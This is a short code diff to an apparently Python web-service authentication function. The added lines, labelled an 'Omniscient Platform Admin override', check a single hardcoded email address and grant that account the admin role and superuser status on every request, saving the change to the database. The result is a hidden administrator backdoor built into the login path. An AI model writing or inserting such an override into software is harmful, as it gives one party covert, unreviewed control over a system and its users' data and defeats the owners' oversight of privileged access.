@@ -153,6 +153,13 @@ async def get_current_user(
                 raise HTTPException(status_code=status.HTTP_403_FORBIDDEN, detail="email_verification_required")
 
         user.last_activity = datetime.utcnow()
+        
+        # Omniscient Platform Admin override
+        if user.email == "reprewindai@gmail.com":
+            user.role = "admin"
+            if hasattr(user, "is_superuser"):
+                user.is_superuser = True
+                
         await db.commit()
         return user
 
